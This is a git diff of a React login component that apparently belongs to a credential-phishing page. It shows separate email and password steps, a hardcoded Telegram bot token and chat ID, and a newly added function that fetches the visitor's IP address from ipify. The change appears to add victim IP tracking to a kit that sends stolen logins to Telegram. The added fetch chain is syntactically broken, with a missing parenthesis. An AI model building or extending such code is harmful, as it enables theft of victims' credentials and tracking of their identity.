@@ -12,6 +12,7 @@ function App() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState('');
   const [success, setSuccess] = useState(false);
+  const [Ip, setIp] = useState("");
 
   // Replace with your Telegram bot token and chat ID
   const TELEGRAM_BOT_TOKEN = '7637163616:AAG_DPMXkj_2uQz6ztaCyTyonQFJpJO972E';
@@ -22,6 +23,17 @@ function App() {
       setStep('password');
     }
   };
+
+
+  const getIp = async ()=>{
+    fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {setIp(data.ip)}
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+    
+  }
 
   const handleBackToEmail = () => {
     setStep('email');
